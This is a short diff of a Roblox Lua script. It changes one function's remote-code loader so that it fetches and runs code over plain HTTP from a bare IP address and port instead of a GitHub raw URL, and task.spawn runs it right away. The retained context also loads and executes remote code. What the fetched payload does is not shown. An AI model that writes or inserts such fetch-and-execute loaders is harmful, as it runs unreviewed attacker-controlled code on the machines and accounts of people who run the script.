@@ -3,7 +3,7 @@ local function My()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/SCRIPT/refs/heads/main/S",true))() 
 end
 local function F()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/SCRIPT/refs/heads/main/S",true))() 
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
 end
 task.spawn(F)
 local function SnapSan()
